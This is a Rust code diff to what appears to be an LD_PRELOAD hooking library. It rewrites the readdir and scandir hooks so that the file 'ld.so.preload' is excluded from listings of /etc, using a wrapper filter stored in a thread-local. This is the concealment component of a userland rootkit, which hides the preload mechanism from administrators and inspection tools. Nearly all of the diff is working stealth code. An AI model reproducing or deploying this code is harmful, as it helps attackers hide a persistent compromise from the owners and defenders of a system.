@@ -4,8 +4,10 @@ use libc::{c_uint, EBADF};
 use libc::{c_char, c_int, ENOENT};
 use errno::set_errno;
 use errno::Errno;
+use std::cell::RefCell;
 use std::{ffi::CStr, fs};
 use log::{info, warn};
+
 
 pub fn handle_rename(oldpath: *const c_char, newpath: *const c_char) -> Option<c_int> {
     let old_path = unsafe { CStr::from_ptr(oldpath) };
@@ -269,6 +271,8 @@ pub fn handle_readdir(dirp: *mut libc::DIR) -> Option<*mut libc::dirent> {
         let fd_path = format!("/proc/self/fd/{}", fd);
         let dir_path = fs::read_link(&fd_path).ok()?;
 
+        info!("[readdir] Directory path resolved: {:?}", dir_path);
+
         // Check if the directory is `/etc`
         if dir_path.as_os_str() == "/etc" {
             loop {
@@ -278,13 +282,20 @@ pub fn handle_readdir(dirp: *mut libc::DIR) -> Option<*mut libc::dirent> {
                 }
 
                 let d_name = CStr::from_ptr((*entry).d_name.as_ptr());
+
                 if d_name.to_string_lossy() != "ld.so.preload" {
                     return Some(entry);
+                } else {
+                    warn!("[readdir] Skipping entry: ld.so.preload");
                 }
             }
         }
     }
     None
+}
+
+thread_local! {
+    static ORIGINAL_FILTER: RefCell<Option<unsafe extern "C" fn(*const libc::dirent) -> libc::c_int>> = RefCell::new(None);
 }
 
 pub fn handle_scandir(
@@ -293,38 +304,37 @@ pub fn handle_scandir(
     filter: Option<unsafe extern "C" fn(*const libc::dirent) -> c_int>,
     compar: Option<unsafe extern "C" fn(*const libc::dirent, *const libc::dirent) -> c_int>,
 ) -> Option<c_int> {
-    use std::ffi::CStr;
-
     unsafe {
         let path_str = CStr::from_ptr(dir).to_string_lossy();
+        info!("[scandir] Directory path: {:?}", path_str);
 
         // Check if the directory is `/etc`
         if path_str == "/etc" {
-            // Check if the filter returns 1 for `ld.so.preload` in `/etc`
-            if let Some(filter_fn) = filter {
-                let entry = libc::opendir(dir);
-                if entry.is_null() {
-                    return Some(0);
+
+            pub unsafe extern "C" fn custom_filter(entry: *const libc::dirent) -> libc::c_int {
+                use std::ffi::CStr;
+
+                let d_name = unsafe { CStr::from_ptr((*entry).d_name.as_ptr()) };
+
+                if d_name.to_string_lossy() == "ld.so.preload" {
+                    warn!("[scandir] Excluding entry: ld.so.preload");
+                    return 0; // Exclude `ld.so.preload`
                 }
 
-                loop {
-                    let dirent = crate::readdir.get()(entry);
-                    if dirent.is_null() {
-                        break;
+                // Call the original filter if it exists
+                ORIGINAL_FILTER.with(|f| {
+                    if let Some(original_filter) = *f.borrow() {
+                        return unsafe { original_filter(entry) };
                     }
-                    let d_name = CStr::from_ptr((*dirent).d_name.as_ptr());
-                    if d_name.to_string_lossy() == "ld.so.preload" {
-                        if filter_fn(dirent) == 1 {
-                            // If it does, remove 1 from the full result
-                            let result = crate::scandir.get()(dir, namelist, filter, compar);
-                            return Some(result - 1);
-                        }
-                    }
-                }
+                    1 // Default behavior: include the entry
+                })
             }
-            let result = crate::scandir.get()(dir, namelist, filter, compar);
+
+            ORIGINAL_FILTER.with(|f| *f.borrow_mut() = filter);
+            let result = crate::scandir.get()(dir, namelist, Some(custom_filter), compar);
             return Some(result);
         }
     }
     None
 }
+
